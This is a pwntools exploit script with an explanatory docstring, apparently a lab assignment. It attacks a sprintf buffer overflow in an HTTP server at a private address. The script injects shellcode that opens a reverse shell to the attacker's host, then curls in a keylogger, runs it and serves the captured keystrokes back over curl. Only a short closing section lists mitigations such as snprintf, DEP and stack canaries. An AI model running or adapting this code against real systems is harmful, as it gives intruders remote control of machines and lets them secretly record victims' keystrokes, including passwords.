'''
[Exploit Overview]
This exploit launches ./keylogger with code injection.
The payload is injected through a buffer and exploits the bufferoverflow vulnerability to overwrite the return address.

The keylogger is installed using a reverse shell. The logged keyboard events can be curled by the attacker.

[Challenges & Decisions]
Challenge 1: installing the keylogger binary on the victim machine
  This can be achieved with two methods:

  Method 1: a) create a file with sys_creat.
            b) append the keylogger binary to this file. The buffer fits the whole keylogger binary.
            c) start the keylogger in the same way as scenario1
  Method 2: a) spawn a reverse shell
            b) curl and execute the keylogger

  The advantage of Method 2 is that you have full control over the server application with sudo rights. You can even change the password of the victim VM.

Challenge 2: accessing the logged keyboard events
 - The attacker can access the logged keyboard events with a curl like in the other exploits. This is possible because our exploit starts the keylogger
   in a separate process, which preserves the functionality of the server application after the attack.

[Execution Instructions]
1. Put the keylogger "keylogger" in the same directory as the exploit (on the attacker's machine)
2. Run the exploit. A reverse shell spawns, the keylogger is curled in and executed automatically. You have full control over the victim's machine from the shell.
3. curl the logged keyboard events from the attacker's machine with curl http://{IP}:{PORT}/logged_keyboard_events.txt

[Vulnerability Discovery]
1. The buffer size increased from 0x500 to 0x500000. (not a vulnerability, but it fits the whole keylogger binary -> Method 1)
2. sprintf in C is considered unsafe as it lacks bounds checking, potentially leading to buffer overflows.

[Preventive Measures]
- Safer alternatives like snprintf should be used.
- Data Execution Prevention (mostly) prevents code injection unless disabled by the attacker.
- Although stack canaries and secure library function make code injection harder, they do not always prevent it outright.
'''


from http.server import HTTPServer, SimpleHTTPRequestHandler
import threading
import pwn

log_buffer_rbp_offset = 0x450
original_rbp = 0x7ffff75cfe20

def start_server():
    httpd = HTTPServer(('192.168.0.157', 8000), SimpleHTTPRequestHandler)
    httpd.serve_forever()

if __name__.__eq__('__main__'):
    pwn.context.encoding = 'latin-1'
    pwn.context.log_level = 'error'

    target = "192.168.0.226"
    port = 8080

    local_target = "192.168.0.157"
    local_port = 1234

    t = threading.Thread(target=start_server)
    t.start()
    io = pwn.remote(target, port)

    # check the README
    shell = """
        xor eax, eax
        mov al, 57
        syscall
        test eax, eax
        jnz crash
    """

    shell_parent = """
    crash:
        xor eax, eax
        mov al, 60
        syscall
    """

    # https://docs.pwntools.com/en/stable/shellcraft/amd64.html
    shellcode = pwn.asm(shell + pwn.pwnlib.shellcraft.amd64.linux.connect(local_target, local_port, avoid='\x00') + pwn.pwnlib.shellcraft.amd64.linux.dupsh(avoid='\x00') + shell_parent, arch="amd64")

    format = b"== Request from " + b"A" * 15 + b" at fd " + b"A" * 10 + b"\n"

    get_request = f"GET /data HTTP/1.1\r\nHost: 192.168.0.226:8080\r\nUser-Agent: curl/8.4.0\r\nAccept: */*\r\nContent-Type: text/plain\r\nContent-Length: 511\r\nAuthorization: Basic%s\r\n\r\n"
    print("request length: " + str(len(get_request)))
    get_request = get_request.encode('latin-1')

    offset = len(f"== Request from {target}" + " " * (15 - len(target)) + f" at fd 4         \nGET /data HTTP/1.1\r\nHost: {target}:{port}\r\nUser-Agent: curl/8.4.0\r\nAccept: */*\r\nContent-Type: text/plain\r\nContent-Length: 511\r\nAuthorization: Basic")

    # calculate address log_message+280 (return)
    shellcode_location = original_rbp - log_buffer_rbp_offset + offset

    # This needs to be at log_message+280: 0x7ffff75cfe20
    pwn.log.info(f"shellcode should be stored at: {hex(shellcode_location)} based on calculations...")

    listener = pwn.listen(local_port)

    # Calculate padding size
    padding_size = ((((log_buffer_rbp_offset + 8 - len(format)) - len(get_request)) - 2) - len(shellcode))

    # Prepare exploit
    server_sc3 = get_request.replace(b"%s", shellcode + b"q" * padding_size + b"BBBBBBBB" + pwn.p64(shellcode_location)[:-2])
    print("request lengte: " + str(len(server_sc3)))

    ### PERFORM ATTACK ###
    io.send(server_sc3)
    l = listener.wait_for_connection()

    curl = f"curl http://{local_target}:{8000}/keylogger -o keylogger"
    l.sendline(curl.encode('latin-1'))
    l.sendline(b"chmod +x ./keylogger")
    l.sendline(b"./keylogger &")
    l.interactive()
    t.join()